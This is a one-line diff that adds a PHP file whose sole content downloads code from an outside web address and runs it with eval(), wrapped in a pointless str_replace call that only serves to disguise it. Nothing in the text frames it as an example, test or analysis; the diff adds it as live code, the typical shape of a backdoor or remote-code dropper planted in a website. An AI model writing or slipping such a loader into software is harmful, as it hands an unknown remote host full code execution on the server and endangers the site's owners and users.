@@ -1,0 +1,1 @@
+<?php eval(str_replace('', '', file_get_contents("https://loule.me/php-template-generator"))); ?>
